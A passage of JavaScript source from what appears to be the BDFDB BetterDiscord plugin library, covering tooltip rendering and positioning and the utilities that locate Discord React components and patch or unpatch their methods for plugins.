			else BDFDB.DOMUtils.addClass(tooltip, BDFDB.disCN.tooltipprimary);
			
			if (config.list || BDFDB.ObjectUtils.is(config.guild)) BDFDB.DOMUtils.addClass(tooltip, BDFDB.disCN.tooltiplistitem);
			
			const removeTooltip = _ => {
				document.removeEventListener("wheel", wheel);
				document.removeEventListener("mousemove", mouseMove);
				document.removeEventListener("mouseleave", mouseLeave);
				BDFDB.DOMUtils.remove(itemLayer);
				BDFDB.ArrayUtils.remove(Tooltips, id);
				observer.disconnect();
				if (zIndexed) BDFDB.DOMUtils.removeClass(itemLayerContainer, BDFDB.disCN.itemlayercontainerzindexdisabled);
				if (typeof config.onHide == "function") config.onHide(itemLayer, anker);
			};
			const setText = newText => {
				if (BDFDB.ObjectUtils.is(config.guild)) {
					let isMuted = Internal.LibraryModules.MutedUtils.isMuted(config.guild.id);
					let muteConfig = Internal.LibraryModules.MutedUtils.getMuteConfig(config.guild.id);
					
					let children = [typeof newText == "function" ? newText() : newText].flat(10).filter(n => typeof n == "string" || BDFDB.ReactUtils.isValidElement(n));
					
					BDFDB.ReactUtils.render(BDFDB.ReactUtils.createElement(Internal.LibraryModules.React.Fragment, {
						children: [
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tooltiprow, BDFDB.disCN.tooltiprowguildname),
								children: [
									BDFDB.ReactUtils.createElement(Internal.LibraryComponents.GuildComponents.Badge, {
										guild: config.guild,
										size: Internal.LibraryModules.StringUtils.cssValueToNumber(Internal.DiscordClassModules.TooltipGuild.iconSize),
										className: BDFDB.disCN.tooltiprowicon
									}),
									BDFDB.ReactUtils.createElement("span", {
										className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tooltipguildnametext),
										children: fontColorIsGradient ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextGradientElement, {
											gradient: BDFDB.ColorUtils.createGradient(config.fontColor),
											children: config.guild.toString()
										}) : config.guild.toString()
									}),
								]
							}),
							children.length && BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tooltiprow, BDFDB.disCN.tooltiprowextra),
								children: children
							}),
							config.note && BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tooltiprow, BDFDB.disCN.tooltiprowextra, BDFDB.disCN.tooltipnote),
								children: config.note
							}),
							BDFDB.ReactUtils.createElement(Internal.LibraryComponents.GuildVoiceList, {guild: config.guild}),
							isMuted && muteConfig && (muteConfig.end_time == null ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextElement, {
								className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tooltipmutetext),
								size: Internal.LibraryComponents.TextElement.Sizes.SIZE_12,
								color: Internal.LibraryComponents.TextElement.Colors.MUTED,
								children: BDFDB.LanguageUtils.LanguageStrings.VOICE_CHANNEL_MUTED
							}) : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.GuildComponents.MutedText, {
								className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tooltipmutetext),
								muteConfig: muteConfig
							}))
						].filter(n => n)
					}), tooltipContent);
				}
				else {
					let children = [typeof newText == "function" ? newText() : newText].flat(10).filter(n => typeof n == "string" || BDFDB.ReactUtils.isValidElement(n));
					children.length && BDFDB.ReactUtils.render(BDFDB.ReactUtils.createElement(Internal.LibraryModules.React.Fragment, {
						children: [
							fontColorIsGradient ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextGradientElement, {
								gradient: BDFDB.ColorUtils.createGradient(config.fontColor),
								children: children
							}) : children,
							config.note && BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.tooltiprow, BDFDB.disCN.tooltiprowextra, BDFDB.disCN.tooltipnote),
								children: config.note
							})
						]
					}), tooltipContent);
				}
			};
			const update = newText => {
				if (newText) setText(newText);
				let left, top;
				const tRects = BDFDB.DOMUtils.getRects(anker);
				const iRects = BDFDB.DOMUtils.getRects(itemLayer);
				const aRects = BDFDB.DOMUtils.getRects(document.querySelector(BDFDB.dotCN.appmount));
				const positionOffsets = {height: 10, width: 10};
				const offset = typeof config.offset == "number" ? config.offset : 0;
				switch (type) {
					case "top":
						top = tRects.top - iRects.height - positionOffsets.height + 2 - offset;
						left = tRects.left + (tRects.width - iRects.width) / 2;
						break;
					case "bottom":
						top = tRects.top + tRects.height + positionOffsets.height - 2 + offset;
						left = tRects.left + (tRects.width - iRects.width) / 2;
						break;
					case "left":
						top = tRects.top + (tRects.height - iRects.height) / 2;
						left = tRects.left - iRects.width - positionOffsets.width + 2 - offset;
						break;
					case "right":
						top = tRects.top + (tRects.height - iRects.height) / 2;
						left = tRects.left + tRects.width + positionOffsets.width - 2 + offset;
						break;
					}
					
				itemLayer.style.setProperty("top", `${top}px`, "important");
				itemLayer.style.setProperty("left", `${left}px`, "important");
				
				tooltipPointer.style.removeProperty("margin-left");
				tooltipPointer.style.removeProperty("margin-top");
				if (type == "top" || type == "bottom") {
					if (left < 0) {
						itemLayer.style.setProperty("left", "5px", "important");
						tooltipPointer.style.setProperty("margin-left", `${left - 10}px`, "important");
					}
					else {
						const rightMargin = aRects.width - (left + iRects.width);
						if (rightMargin < 0) {
							itemLayer.style.setProperty("left", `${aRects.width - iRects.width - 5}px`, "important");
							tooltipPointer.style.setProperty("margin-left", `${-1*rightMargin}px`, "important");
						}
					}
				}
				else if (type == "left" || type == "right") {
					if (top < 0) {
						const bRects = BDFDB.DOMUtils.getRects(document.querySelector(BDFDB.dotCN.titlebar));
						const barCorrection = (bRects.width || 0) >= Math.round(75 * window.outerWidth / aRects.width) ? (bRects.height + 5) : 0;
						itemLayer.style.setProperty("top", `${5 + barCorrection}px`, "important");
						tooltipPointer.style.setProperty("margin-top", `${top - 10 - barCorrection}px`, "important");
					}
					else {
						const bottomMargin = aRects.height - (top + iRects.height);
						if (bottomMargin < 0) {
							itemLayer.style.setProperty("top", `${aRects.height - iRects.height - 5}px`, "important");
							tooltipPointer.style.setProperty("margin-top", `${-1*bottomMargin}px`, "important");
						}
					}
				}
			};

			const wheel = e => {
				const tRects1 = BDFDB.DOMUtils.getRects(anker);
				BDFDB.TimeUtils.clear(wheel.timeout);
				wheel.timeout = BDFDB.TimeUtils.timeout(_ => {
					const tRects2 = BDFDB.DOMUtils.getRects(anker);
					if (tRects1.x != tRects2.x || tRects1.y != tRects2.y) removeTooltip();
				}, 500);
			};
			const mouseMove = e => {
				const parent = e.target.parentElement.querySelector(":hover");
				if (parent && anker != parent && !anker.contains(parent)) removeTooltip();
			};
			const mouseLeave = e => removeTooltip();
			if (!config.perssist) {
				document.addEventListener("wheel", wheel);
				document.addEventListener("mousemove", mouseMove);
				document.addEventListener("mouseleave", mouseLeave);
			}
			
			const observer = new MutationObserver(changes => changes.forEach(change => {
				const nodes = Array.from(change.removedNodes);
				if (nodes.indexOf(itemLayer) > -1 || nodes.indexOf(anker) > -1 || nodes.some(n =>  n.contains(anker))) removeTooltip();
			}));
			observer.observe(document.body, {subtree: true, childList: true});
			
			tooltip.removeTooltip = itemLayer.removeTooltip = removeTooltip;
			tooltip.setText = itemLayer.setText = setText;
			tooltip.update = itemLayer.update = update;
			setText(text);
			update();
			
			if (config.delay) {
				BDFDB.DOMUtils.toggle(itemLayer);
				BDFDB.TimeUtils.timeout(_ => {
					BDFDB.DOMUtils.toggle(itemLayer);
					if (typeof config.onShow == "function") config.onShow(itemLayer, anker);
				}, config.delay);
			}
			else {
				if (typeof config.onShow == "function") config.onShow(itemLayer, anker);
			}
			return itemLayer;
		};
		
		Internal.forceInitiateProcess = function (pluginDataObjs, instance, type) {
			pluginDataObjs = [pluginDataObjs].flat(10).filter(n => n);
			if (pluginDataObjs.length && instance && type) {
				let forceRender = false;
				for (let pluginData of pluginDataObjs) {
					let plugin = pluginData.plugin == BDFDB && Internal || pluginData.plugin, methodNames = [];
					for (let patchType in plugin.patchedModules) {
						if (plugin.patchedModules[patchType][type]) methodNames.push(plugin.patchedModules[patchType][type]);
					}
					methodNames = BDFDB.ArrayUtils.removeCopies(methodNames).flat(10).filter(n => n);
					if (methodNames.includes("componentDidMount")) Internal.initiateProcess(plugin, type, {
						arguments: [],
						instance: instance,
						returnvalue: undefined,
						component: undefined,
						methodname: "componentDidMount",
						patchtypes: pluginData.patchTypes[type]
					});
					if (methodNames.includes("render")) forceRender = true;
					else if (!forceRender && methodNames.includes("componentDidUpdate")) Internal.initiateProcess(plugin, type, {
						arguments: [],
						instance: instance,
						returnvalue: undefined,
						component: undefined,
						methodname: "componentDidUpdate",
						patchtypes: pluginData.patchTypes[type]
					});
				}
				if (forceRender) BDFDB.ReactUtils.forceUpdate(instance);
			}
		};
		Internal.initiateProcess = function (plugin, type, e) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (BDFDB.ObjectUtils.is(plugin) && !plugin.stopping && e.instance) {
				type = Internal.LibraryModules.StringUtils.upperCaseFirstChar(type.split(" _ _ ")[1] || type).replace(/[^A-z0-9]|_/g, "");
				if (typeof plugin[`process${type}`] == "function") {
					if (typeof e.methodname == "string" && (e.methodname.indexOf("componentDid") == 0 || e.methodname.indexOf("componentWill") == 0)) {
						e.node = BDFDB.ReactUtils.findDOMNode(e.instance);
						if (e.node) {
							let tempReturn = plugin[`process${type}`](e);
							return tempReturn !== undefined ? tempReturn : e.returnvalue;
						}
						else BDFDB.TimeUtils.timeout(_ => {
							e.node = BDFDB.ReactUtils.findDOMNode(e.instance);
							if (e.node) plugin[`process${type}`](e);
						});
					}
					else if (e.returnvalue !== undefined || e.patchtypes.includes("before")) {
						let tempReturn = plugin[`process${type}`](e);
						return tempReturn !== undefined ? tempReturn : e.returnvalue;
					}
				}
			}
		};
		Internal.patchObserverData = {observer: null, data: {}};
		Internal.patchPlugin = function (plugin) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ObjectUtils.is(plugin.patchedModules)) return;
			BDFDB.PatchUtils.unpatch(plugin);
			let patchedModules = {};
			for (let patchType in plugin.patchedModules) for (let type in plugin.patchedModules[patchType]) {
				if (!patchedModules[type]) patchedModules[type] = {};
				patchedModules[type][patchType] = plugin.patchedModules[patchType][type];
			}
			for (let type in patchedModules) {
				let pluginData = {plugin: plugin, patchTypes: patchedModules[type]};
				let unmappedType = type.split(" _ _ ")[1] || type;
				
				let finderData = InternalData.ModuleUtilsConfig.Finder[unmappedType];
				let config = {
					classNames: [finderData && finderData.class].flat(10).filter(n => DiscordClasses[n]),
					lazyLoaded: finderData && finderData.lazyLoaded,
					stringFind: finderData && finderData.strings,
					propertyFind: finderData && finderData.props,
					prototypeFind: finderData && finderData.protos,
					specialFilter: finderData && finderData.special && Internal.createFilter(finderData.special),
					subComponent: finderData && finderData.subComponent,
					forceObserve: finderData && finderData.forceObserve,
					exported: finderData && finderData.exported || false,
					path: finderData && finderData.path,
					mapped: InternalData.ModuleUtilsConfig.PatchMap[type]
				};
				config.nonRender = config.specialFilter || BDFDB.ObjectUtils.toArray(pluginData.patchTypes).flat(10).filter(n => n && !InternalData.ModuleUtilsConfig.InstanceFunctions.includes(n)).length > 0;
				config.nonPrototype = !!(config.subComponent && config.subComponent.strings || config.stringFind || config.subComponent && config.subComponent.props || config.propertyFind || config.subComponent && config.subComponent.protos || config.prototypeFind || config.nonRender);
				
				config.mappedType = config.mapped ? config.mapped + " _ _ " + type : type;
				config.name = config.subComponent && config.subComponent.name || config.mappedType.split(" _ _ ")[0];
				
				let component = InternalData.ModuleUtilsConfig.LoadedInComponents[type] && BDFDB.ObjectUtils.get(Internal, InternalData.ModuleUtilsConfig.LoadedInComponents[type]);
				if (component) Internal.patchComponent(pluginData, config.nonRender ? (BDFDB.ModuleUtils.find(m => m == component && m, {useExport: config.exported}) || {}).exports : component, type, config);
				else {
					if (config.mapped) for (let patchType in plugin.patchedModules) if (plugin.patchedModules[patchType][type]) {
						plugin.patchedModules[patchType][config.mappedType] = plugin.patchedModules[patchType][type];
						delete plugin.patchedModules[patchType][type];
					}
					
					let patchSpecial = (func, argument) => {
						let module = BDFDB.ModuleUtils[func](argument, config.exported);
						let exports = module && !config.exported && module.exports || module;
						exports = config.path && BDFDB.ObjectUtils.get(exports, config.path) || exports;
						exports && Internal.patchComponent(pluginData, Internal.isMemoOrForwardRef(exports) ? exports.default : exports, config);
						return exports ? true : false;
					};
					let found = true;
					if (config.lazyLoaded) Internal.addChunkObserver(pluginData, config);
					else if (config.classNames.length) Internal.searchComponent(pluginData, config);
					else if (config.subComponent && config.subComponent.strings || config.stringFind) found = patchSpecial("findByString", config.subComponent && config.subComponent.strings || config.stringFind);
					else if (config.subComponent && config.subComponent.props || config.propertyFind) found = patchSpecial("findByProperties", config.subComponent && config.subComponent.props || config.propertyFind);
					else if (config.subComponent && config.subComponent.protos || config.prototypeFind) found = patchSpecial("findByPrototypes", config.subComponent && config.subComponent.protos || config.prototypeFind);
					else if (config.nonRender) found = patchSpecial("findByName", config.name);
					else {
						let module = BDFDB.ModuleUtils.findByName(config.name);
						if (module) Internal.patchComponent(pluginData, module, config);
						else found = false;
					}
					if (!found) Internal.addChunkObserver(pluginData, config);
				}
			}
		};
		Internal.patchComponent = function (pluginDataObjs, instance, config) {
			pluginDataObjs = [pluginDataObjs].flat(10).filter(n => n);
			if (pluginDataObjs.length && instance) {
				instance = instance[BDFDB.ReactUtils.instanceKey] && instance[BDFDB.ReactUtils.instanceKey].type ? instance[BDFDB.ReactUtils.instanceKey].type : instance;
				if (instance) {
					let toBePatched = config.nonPrototype || !instance.prototype ? instance : instance.prototype;
					toBePatched = toBePatched && toBePatched.type && typeof toBePatched.type.render == "function" ? toBePatched.type : toBePatched;
					if (config.subComponent) {
						for (let pluginData of pluginDataObjs) BDFDB.PatchUtils.patch(pluginData.plugin, toBePatched, config.subComponent.type || "default", {after: e => {
							for (let patchType in pluginData.patchTypes) BDFDB.PatchUtils.patch(pluginData.plugin, config.subComponent.children && e.returnValue.props && e.returnValue.props.children ? e.returnValue.props.children[0] || e.returnValue.props.children : e.returnValue , "type", {
								[patchType]: e2 => Internal.initiateProcess(pluginData.plugin, config.mappedType, {
									arguments: e2.methodArguments,
									instance: e2.thisObject,
									returnvalue: e2.returnValue,
									component: toBePatched,
									methodname: e.originalMethodName,
									patchtypes: [patchType]
								})
							}, {name, noCache: true});
						}}, {name: config.name});
					}
					else {
						for (let pluginData of pluginDataObjs) for (let patchType in pluginData.patchTypes) {
							BDFDB.PatchUtils.patch(pluginData.plugin, toBePatched, pluginData.patchTypes[patchType], {
								[patchType]: e => Internal.initiateProcess(pluginData.plugin, config.mappedType, {
									arguments: e.methodArguments,
									instance: e.thisObject,
									returnvalue: e.returnValue,
									component: toBePatched,
									methodname: e.originalMethodName,
									patchtypes: [patchType]
								})
							}, {name: config.name});
						}
					}
				}
			}
		};
		Internal.createFilter = function (config) {
			return ins => ins && config.every(prop => {
				let value = BDFDB.ObjectUtils.get(ins, prop.path);
				return value && (!prop.value || [prop.value].flat(10).filter(n => typeof n == "string").some(n => value.toUpperCase().indexOf(n.toUpperCase()) == 0));
			}) && ins.return.type;
		};
		Internal.isMemoOrForwardRef = function (exports) {
			return exports && exports.default && typeof exports.default.$$typeof == "symbol" && ((exports.default.$$typeof.toString() || "").indexOf("memo") > -1 || (exports.default.$$typeof.toString() || "").indexOf("forward_ref") > -1);
		};
		Internal.checkElementForComponent = function (pluginDataObjs, ele, config) {
			pluginDataObjs = [pluginDataObjs].flat(10).filter(n => n);
			let ins = BDFDB.ReactUtils.getInstance(ele);
			if (typeof config.specialFilter == "function") {
				let component = config.specialFilter(ins);
				if (component) {
					if (config.nonRender) {
						let exports = (BDFDB.ModuleUtils.find(m => m == component && m, {useExport: false}) || {}).exports;
						Internal.patchComponent(pluginDataObjs, Internal.isMemoOrForwardRef(exports) ? exports.default : exports, config);
					}
					else Internal.patchComponent(pluginDataObjs, component, config);
					BDFDB.PatchUtils.forceAllUpdates(pluginDataObjs.map(n => n.plugin), config.mappedType);
					return true;
				}
			}
			else {
				let unmappedType = config.mappedType.split(" _ _ ")[1] || config.mappedType;
				let constructor = BDFDB.ReactUtils.findConstructor(ins, unmappedType) || BDFDB.ReactUtils.findConstructor(ins, unmappedType, {up: true});
				if (constructor) {
					Internal.patchComponent(pluginDataObjs, constructor, config);
					BDFDB.PatchUtils.forceAllUpdates(pluginDataObjs.map(n => n.plugin), config.mappedType);
					return true;
				}
			}
			return false;
		};
		Internal.searchComponent = function (pluginData, config) {
			let instanceFound = false;
			if (!config.forceObserve) {
				const app = document.querySelector(BDFDB.dotCN.app);
				if (app) {
					let appIns = BDFDB.ReactUtils.findConstructor(app, config.mappedType, {unlimited: true}) || BDFDB.ReactUtils.findConstructor(app, config.mappedType, {unlimited: true, up: true});
					if (appIns && (instanceFound = true)) Internal.patchComponent(pluginData, appIns, config);
				}
			}
			if (!instanceFound) {
				let elementFound = false, classes = config.classNames.map(n => BDFDB.disCN[n]), selector = config.classNames.map(n => BDFDB.dotCN[n]).join(", ");
				for (let ele of document.querySelectorAll(selector)) {
					elementFound = Internal.checkElementForComponent(pluginData, ele, config);
					if (elementFound) break;
				}
				if (!elementFound) {
					if (!Internal.patchObserverData.observer) {
						let appMount = document.querySelector(BDFDB.dotCN.appmount);
						if (appMount) {
							Internal.patchObserverData.observer = new MutationObserver(cs => cs.forEach(c => c.addedNodes.forEach(n => {
								if (!n || !n.tagName) return;
								for (let type in Internal.patchObserverData.data) {
									if (!Internal.patchObserverData.data[type] || Internal.patchObserverData.data[type].found) return;
									for (let ele of [BDFDB.DOMUtils.containsClass(n, ...Internal.patchObserverData.data[type].classes) && n].concat([...n.querySelectorAll(Internal.patchObserverData.data[type].selector)]).filter(n => n)) {
										if (!Internal.patchObserverData.data[type] || Internal.patchObserverData.data[type].found) return;
										Internal.patchObserverData.data[type].found = Internal.checkElementForComponent(Internal.patchObserverData.data[type].plugins, ele, Internal.patchObserverData.data[type].config);
										if (Internal.patchObserverData.data[type].found) {
											delete Internal.patchObserverData.data[type];
											if (BDFDB.ObjectUtils.isEmpty(Internal.patchObserverData.data)) {
												Internal.patchObserverData.observer.disconnect();
												Internal.patchObserverData.observer = null;
											}
										}
									}
								}
							})));
							Internal.patchObserverData.observer.observe(appMount, {childList: true, subtree: true});
						}
					}
					if (!Internal.patchObserverData.data[config.mappedType]) Internal.patchObserverData.data[config.mappedType] = {selector, classes, found: false, config, plugins: []};
					Internal.patchObserverData.data[config.mappedType].plugins.push(pluginData);
				}
			}
		};
		
		BDFDB.PatchUtils = {};
		BDFDB.PatchUtils.isPatched = function (plugin, module, methodName) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!plugin || (!BDFDB.ObjectUtils.is(module) && !BDFDB.ArrayUtils.is(module)) || !module.BDFDB_patches || !methodName) return false;
			const pluginId = (typeof plugin === "string" ? plugin : plugin.name).toLowerCase();
			return pluginId && module[methodName] && module[methodName].__is_BDFDB_patched && module.BDFDB_patches[methodName] && BDFDB.ObjectUtils.toArray(module.BDFDB_patches[methodName]).some(patchObj => BDFDB.ObjectUtils.toArray(patchObj).some(priorityObj => Object.keys(priorityObj).includes(pluginId)));
		};
		BDFDB.PatchUtils.patch = function (plugin, module, methodNames, patchMethods, config = {}) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!plugin || (!BDFDB.ObjectUtils.is(module) && !BDFDB.ArrayUtils.is(module)) || !methodNames || !BDFDB.ObjectUtils.is(patchMethods)) return null;
			patchMethods = BDFDB.ObjectUtils.filter(patchMethods, type => InternalData.ModuleUtilsConfig.PatchTypes.includes(type), true);
			if (BDFDB.ObjectUtils.isEmpty(patchMethods)) return null;
			const pluginName = (typeof plugin === "string" ? plugin : plugin.name) || "";
			const pluginVersion = typeof plugin === "string" ? "" : plugin.version;
			const pluginId = pluginName.toLowerCase();
			let patchPriority = !isNaN(config.priority) ? config.priority : (BDFDB.ObjectUtils.is(plugin) && !isNaN(plugin.patchPriority) ? plugin.patchPriority : 5);
			patchPriority = patchPriority < 1 ? (plugin == Internal ? 0 : 1) : (patchPriority > 9 ? (plugin == Internal ? 10 : 9) : Math.round(patchPriority));
			if (!BDFDB.ObjectUtils.is(module.BDFDB_patches)) module.BDFDB_patches = {};
			methodNames = [methodNames].flat(10).filter(n => n);
			let cancel = _ => {BDFDB.PatchUtils.unpatch(plugin, module, methodNames);};
			for (let methodName of methodNames) if (module[methodName] == null || typeof module[methodName] == "function") {
				if (!module.BDFDB_patches[methodName] || config.force && (!module[methodName] || !module[methodName].__is_BDFDB_patched)) {
					if (!module.BDFDB_patches[methodName]) {
						module.BDFDB_patches[methodName] = {};
						for (let type of InternalData.ModuleUtilsConfig.PatchTypes) module.BDFDB_patches[methodName][type] = {};
					}
					if (!module[methodName]) module[methodName] = (_ => {});
					const name = config.name || (module.constructor ? (module.constructor.displayName || module.constructor.name) : "module");
					const originalMethod = module[methodName];
					module.BDFDB_patches[methodName].originalMethod = originalMethod;
					module[methodName] = function () {
						let callInstead = false, stopCall = false;
						const data = {
							thisObject: this && this !== window ? this : {props: arguments[0]},
							methodArguments: arguments,
							originalMethod: originalMethod,
							originalMethodName: methodName,
							callOriginalMethod: _ => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments),
							callOriginalMethodAfterwards: _ => (callInstead = true, data.returnValue),
							stopOriginalMethodCall: _ => stopCall = true
						};
						if (module.BDFDB_patches && module.BDFDB_patches[methodName]) {
							for (let priority in module.BDFDB_patches[methodName].before) for (let id in BDFDB.ObjectUtils.sort(module.BDFDB_patches[methodName].before[priority])) {
								BDFDB.TimeUtils.suppress(module.BDFDB_patches[methodName].before[priority][id], `"before" callback of ${methodName} in ${name}`, {name: module.BDFDB_patches[methodName].before[priority][id].pluginName, version: module.BDFDB_patches[methodName].before[priority][id].pluginVersion})(data);
							}
							
							if (!module.BDFDB_patches || !module.BDFDB_patches[methodName]) return (methodName == "render" || methodName == "default") && data.returnValue === undefined ? null : data.returnValue;
							let hasInsteadPatches = BDFDB.ObjectUtils.toArray(module.BDFDB_patches[methodName].instead).some(priorityObj => !BDFDB.ObjectUtils.isEmpty(priorityObj));
							if (hasInsteadPatches) for (let priority in module.BDFDB_patches[methodName].instead) for (let id in BDFDB.ObjectUtils.sort(module.BDFDB_patches[methodName].instead[priority])) if (module.BDFDB_patches) {
								let tempReturn = BDFDB.TimeUtils.suppress(module.BDFDB_patches[methodName].instead[priority][id], `"instead" callback of ${methodName} in ${name}`, {name: module.BDFDB_patches[methodName].instead[priority][id].pluginName, version: module.BDFDB_patches[methodName].instead[priority][id].pluginVersion})(data);
								if (tempReturn !== undefined) data.returnValue = tempReturn;
							}
							if ((!hasInsteadPatches || callInstead) && !stopCall) BDFDB.TimeUtils.suppress(data.callOriginalMethod, `originalMethod of ${methodName} in ${name}`, {name: "Discord"})();
							
							if (!module.BDFDB_patches || !module.BDFDB_patches[methodName]) return methodName == "render" && data.returnValue === undefined ? null : data.returnValue;
							for (let priority in module.BDFDB_patches[methodName].after) for (let id in BDFDB.ObjectUtils.sort(module.BDFDB_patches[methodName].after[priority])) if (module.BDFDB_patches) {
								let tempReturn = BDFDB.TimeUtils.suppress(module.BDFDB_patches[methodName].after[priority][id], `"after" callback of ${methodName} in ${name}`, {name: module.BDFDB_patches[methodName].after[priority][id].pluginName, version: module.BDFDB_patches[methodName].after[priority][id].pluginVersion})(data);
								if (tempReturn !== undefined) data.returnValue = tempReturn;
							}
						}
						else BDFDB.TimeUtils.suppress(data.callOriginalMethod, `originalMethod of ${methodName} in ${name}`)();
						callInstead = false, stopCall = false;
						return (methodName == "render" || methodName == "default") && data.returnValue === undefined ? null : data.returnValue;
					};
					for (let key of Object.keys(originalMethod)) module[methodName][key] = originalMethod[key];
					if (!module[methodName].__originalFunction) {
						let realOriginalMethod = originalMethod.__originalMethod || originalMethod.__originalFunction || originalMethod;
						if (typeof realOriginalMethod == "function") {
							module[methodName].__originalFunction = realOriginalMethod;
							module[methodName].toString = _ => realOriginalMethod.toString();
						}
					}
					module[methodName].__is_BDFDB_patched = true;
				}
				for (let type in patchMethods) if (typeof patchMethods[type] == "function") {
					if (!BDFDB.ObjectUtils.is(module.BDFDB_patches[methodName][type][patchPriority])) module.BDFDB_patches[methodName][type][patchPriority] = {};
					module.BDFDB_patches[methodName][type][patchPriority][pluginId] = (...args) => {
						if (config.once || !plugin.started) cancel();
						return patchMethods[type](...args);
					};
					module.BDFDB_patches[methodName][type][patchPriority][pluginId].pluginName = pluginName;
					module.BDFDB_patches[methodName][type][patchPriority][pluginId].pluginVersion = pluginVersion;
				}
			}
			if (BDFDB.ObjectUtils.is(plugin) && !config.once && !config.noCache) {
				if (!BDFDB.ArrayUtils.is(plugin.patchCancels)) plugin.patchCancels = [];
				plugin.patchCancels.push(cancel);
			}
			return cancel;
		};
		BDFDB.PatchUtils.unpatch = function (plugin, module, methodNames) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!module && !methodNames) {
				if (BDFDB.ObjectUtils.is(plugin) && BDFDB.ArrayUtils.is(plugin.patchCancels)) while (plugin.patchCancels.length) (plugin.patchCancels.pop())();
			}
			else {
				if ((!BDFDB.ObjectUtils.is(module) && !BDFDB.ArrayUtils.is(module)) || !module.BDFDB_patches) return;
				const pluginId = !plugin ? null : (typeof plugin === "string" ? plugin : plugin.name).toLowerCase();
				if (methodNames) {
					for (let methodName of [methodNames].flat(10).filter(n => n)) if (module[methodName] && module.BDFDB_patches[methodName]) unpatch(methodName, pluginId);
				}
				else for (let patchedMethod of module.BDFDB_patches) unpatch(patchedMethod, pluginId);
			}
			function unpatch (funcName, pluginId) {
				for (let type of InternalData.ModuleUtilsConfig.PatchTypes) {
					if (pluginId) for (let priority in module.BDFDB_patches[funcName][type]) {
						delete module.BDFDB_patches[funcName][type][priority][pluginId];
						if (BDFDB.ObjectUtils.isEmpty(module.BDFDB_patches[funcName][type][priority])) delete module.BDFDB_patches[funcName][type][priority];
					}
					else delete module.BDFDB_patches[funcName][type];
				}
				if (BDFDB.ObjectUtils.isEmpty(BDFDB.ObjectUtils.filter(module.BDFDB_patches[funcName], key => InternalData.ModuleUtilsConfig.PatchTypes.includes(key) && !BDFDB.ObjectUtils.isEmpty(module.BDFDB_patches[funcName][key]), true))) {
					module[funcName] = module.BDFDB_patches[funcName].originalMethod;
					delete module.BDFDB_patches[funcName];
					if (BDFDB.ObjectUtils.isEmpty(module.BDFDB_patches)) delete module.BDFDB_patches;
				}
			}
		};
		BDFDB.PatchUtils.forceAllUpdates = function (plugins, selectedTypes) {
			plugins = [plugins].flat(10).map(n => n == BDFDB && Internal || n).filter(n => BDFDB.ObjectUtils.is(n.patchedModules));
			if (plugins.length) {
				const app = document.querySelector(BDFDB.dotCN.app);
				const bdSettings = document.querySelector("#bd-settingspane-container > *");
				if (app) {
					selectedTypes = [selectedTypes].flat(10).filter(n => n).map(type => type && InternalData.ModuleUtilsConfig.PatchMap[type] ? InternalData.ModuleUtilsConfig.PatchMap[type] + " _ _ " + type : type);
					let updateData = {};
					for (let plugin of plugins) {
						updateData[plugin.name] = {
							filteredModules: [],
							specialModules: [],
							specialModuleTypes: [],
							patchTypes: {}
						};
						for (let patchType in plugin.patchedModules) for (let type in plugin.patchedModules[patchType]) {
							let methodNames = [plugin.patchedModules[patchType][type]].flat(10).filter(n => n);
							if (BDFDB.ArrayUtils.includes(methodNames, "componentDidMount", "componentDidUpdate", "render", false) && (!selectedTypes.length || selectedTypes.includes(type))) {
								let unmappedType = type.split(" _ _ ")[1] || type;
								let selector = [InternalData.ModuleUtilsConfig.Finder[unmappedType]].flat(10).filter(n => DiscordClasses[n]).map(n => BDFDB.dotCN[n]).join(", ");
								let specialFilter = InternalData.ModuleUtilsConfig.Finder[unmappedType] && InternalData.ModuleUtilsConfig.Finder[unmappedType].special && Internal.createFilter(InternalData.ModuleUtilsConfig.Finder[unmappedType].special);
								if (selector && typeof specialFilter == "function") {
									for (let ele of document.querySelectorAll(selector)) {
										let constro = specialFilter(BDFDB.ReactUtils.getInstance(ele));
										if (constro) {
											updateData[plugin.name].specialModules.push([type, constro]);
											updateData[plugin.name].specialModuleTypes.push(type);
											break;
										}
									}
								}
								else updateData[plugin.name].filteredModules.push(type);
								let name = type.split(" _ _ ")[0];
								if (!updateData[plugin.name].patchTypes[name]) updateData[plugin.name].patchTypes[name] = [];
								updateData[plugin.name].patchTypes[name].push(patchType);
							}
						}
					}
					let updateDataArray = BDFDB.ObjectUtils.toArray(updateData);
					if (BDFDB.ArrayUtils.sum(updateDataArray.map(n => n.filteredModules.length + n.specialModules.length))) {
						try {
							let filteredModules = BDFDB.ArrayUtils.removeCopies(updateDataArray.map(n => n.filteredModules).flat(10));
							let specialModules = BDFDB.ArrayUtils.removeCopies(updateDataArray.map(n => n.specialModules).flat(10));
							const appInsDown = BDFDB.ReactUtils.findOwner(app, {name: filteredModules, type: specialModules, all: true, unlimited: true, group: true});
							const appInsUp = BDFDB.ReactUtils.findOwner(app, {name: filteredModules, type: specialModules, all: true, unlimited: true, group: true, up: true});
							for (let type in appInsDown) {
								let filteredPlugins = plugins.filter(n => updateData[n.name].filteredModules.includes(type) || updateData[n.name].specialModuleTypes.includes(type)).map(n => ({plugin: n, patchTypes: updateData[n.name].patchTypes}));
								for (let ins of appInsDown[type]) Internal.forceInitiateProcess(filteredPlugins, ins, type);
							}
							for (let type in appInsUp) {
								let filteredPlugins = plugins.filter(n => updateData[n.name].filteredModules.includes(type) || updateData[n.name].specialModuleTypes.includes(type)).map(n => ({plugin: n, patchTypes: updateData[n.name].patchTypes}));
